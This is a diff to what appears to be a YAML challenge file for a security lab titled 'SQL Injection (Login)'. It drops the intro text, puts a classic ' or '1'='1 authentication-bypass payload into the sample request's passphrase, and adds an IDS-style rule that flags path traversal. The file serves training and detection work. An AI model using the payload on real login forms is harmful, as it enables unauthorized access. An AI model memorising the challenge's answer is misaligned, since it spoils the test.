@@ -2,12 +2,6 @@ name: 'SQL Injection (Login)'
 type: 'exploit'
 
 text: |-
-  It's time to channel your inner Bobby Tables!
-
-  Can you bypass this login form using SQL injection?
-
-  (Although it shouldn't matter, the database is SQLite)
-
   **Goal: Log in**
 
 hints: []
@@ -24,6 +18,9 @@ base_request: |-
   POST / HTTP/1.1
   Host: localhost
 
-  passphrase=thisisnotthepassword
+  passphrase=thisisnotthepassword' or '1'='1
+
+rules:
+- 'alert http any any -> any any (msg:"%%ID%%"; flow:to_server,established; http.method; content:"GET"; http.uri.raw; content:".."; sid:1030005; rev:1;)'
 
 expected_output: "TOP SECRET"
